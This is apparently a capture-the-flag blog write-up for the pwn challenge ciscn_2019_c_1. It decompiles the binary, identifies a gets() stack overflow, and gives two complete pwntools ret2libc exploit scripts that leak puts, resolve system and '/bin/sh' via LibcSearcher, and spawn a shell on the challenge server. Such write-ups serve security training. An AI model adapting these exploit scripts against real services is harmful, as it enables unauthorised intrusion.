@@ -1,0 +1,192 @@
+---
+layout: post
+title:  ciscn_2019_c_1
+date:   2021-01-29 00:01:01 +0300
+image:  2021-01-29-robin.jpg
+tags:   [ctf,PWN,BUU]
+---
+
+ida打开，进入main函数查看
+
+```assembly
+// local variable allocation has failed, the output may be wrong!
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [rsp+Ch] [rbp-4h]
+
+  init(*(_QWORD *)&argc, argv, envp);
+  puts("EEEEEEE                            hh      iii                ");
+  puts("EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  ");
+  puts("EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e ");
+  puts("EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  ");
+  puts("EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee ");
+  puts("====================================================================");
+  puts("Welcome to this Encryption machine\n");
+  begin("Welcome to this Encryption machine\n");
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      fflush(0LL);
+      v4 = 0;
+      __isoc99_scanf("%d", &v4);
+      getchar();
+      if ( v4 != 2 )
+        break;
+      puts("I think you can do it by yourself");
+      begin("I think you can do it by yourself");
+    }
+    if ( v4 == 3 )
+    {
+      puts("Bye!");
+      return 0;
+    }
+    if ( v4 != 1 )
+      break;
+    encrypt();
+    begin("%d");
+  }
+  puts("Something Wrong!");
+  return 0;
+}
+```
+
+encrypt()函数
+
+```assembly
+int encrypt()
+{
+  size_t v0; // rbx
+  char s[48]; // [rsp+0h] [rbp-50h]
+  __int16 v3; // [rsp+30h] [rbp-20h]
+
+  memset(s, 0, sizeof(s));
+  v3 = 0;
+  puts("Input your Plaintext to be encrypted");
+  gets(s);
+  while ( 1 )
+  {
+    v0 = (unsigned int)x;
+    if ( v0 >= strlen(s) )
+      break;
+    if ( s[x] <= 96 || s[x] > 122 )
+    {
+      if ( s[x] <= 64 || s[x] > 90 )
+      {
+        if ( s[x] > 47 && s[x] <= 57 )
+          s[x] ^= 0xFu;
+      }
+      else
+      {
+        s[x] ^= 0xEu;
+      }
+    }
+    else
+    {
+      s[x] ^= 0xDu;
+    }
+    ++x;
+  }
+  puts("Ciphertext");
+  return puts(s);
+}
+```
+
+gets()处存在栈溢出漏洞，可以通过漏洞先泄露puts函数的got地址，从而计算出"/bin/sh"和system函数的地址。然后返回到main函数，再次通过该漏洞getshell。
+
+encrypt()函数中的strlen()函数可以通过"\0"绕过。
+
+```assembly
+from pwn import *
+from LibcSearcher import *
+
+elf = ELF("./ciscn_2019_c_1")
+io = remote("node3.buuoj.cn",25309)
+
+io.recvuntil("Input your choice!\n")
+io.sendline("1")
+
+pop_rdi = 0x400C83
+puts_got = elf.got["puts"]
+puts_plt = 0x4006e0
+main_addr = 0x400b28
+payload = "\0" + "a" * (0x50 + 8 - 1) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
+
+io.recvuntil("Input your Plaintext to be encrypted\n")
+io.sendline(payload)
+
+io.recvuntil("Ciphertext\n\n")
+
+puts = u64(io.recvuntil("\n")[:-1].ljust(8,"\0"))
+# puts = hex(puts)
+# print(int(puts))
+
+libc = LibcSearcher("puts", puts)
+
+libc_addr = puts - libc.dump("puts")
+binsh = libc_addr + libc.dump('str_bin_sh')
+system = libc_addr + libc.dump('system')
+
+io.recvuntil("Input your choice!\n")
+io.sendline("1")
+
+payload = "\0" + "a" * (0x50 + 8 - 1) + p64(pop_rdi) + p64(binsh) + p64(system)
+io.recvuntil("Input your Plaintext to be encrypted\n")
+io.sendline(payload)
+
+io.interactive()
+```
+
+但是并不能达到我们的预期效果。
+
+后来查阅了资料，才知道题目是部署在Ubuntu18上的，因此调用system需要栈对齐，这里填充ret来对齐。
+
+![]({{site.baseurl}}/img/2021-01-29-ret.jpg)
+
+```assembly
+from pwn import *
+from LibcSearcher import *
+import sys
+
+def LongToInt(value):
+    assert isinstance(value, (int, long))
+    return int(value & sys.maxint)
+
+elf = ELF("./ciscn_2019_c_1")
+io = remote("node3.buuoj.cn",25309)
+
+io.recvuntil("Input your choice!\n")
+io.sendline("1")
+
+pop_rdi = 0x400C83
+puts_got = elf.got["puts"]
+puts_plt = 0x4006e0
+main_addr = 0x400b28
+payload = "\0" + "a" * (0x50 + 8 - 1) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
+
+io.recvuntil("Input your Plaintext to be encrypted\n")
+io.sendline(payload)
+
+io.recvuntil("Ciphertext\n\n")
+
+puts = u64(io.recvuntil("\n")[:-1].ljust(8,"\0"))
+# puts = hex(puts)
+# print(int(puts))
+
+libc = LibcSearcher("puts", LongToInt(puts))
+
+libc_addr = puts - libc.dump("puts")
+binsh = libc_addr + libc.dump('str_bin_sh')
+system = libc_addr + libc.dump('system')
+
+io.recvuntil("Input your choice!\n")
+io.sendline("1")
+
+ret=0x4006b9
+payload = "\0" + "a" * (0x50 + 8 - 1) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
+io.recvuntil("Input your Plaintext to be encrypted\n")
+io.sendline(payload)
+
+io.interactive()
+```
+
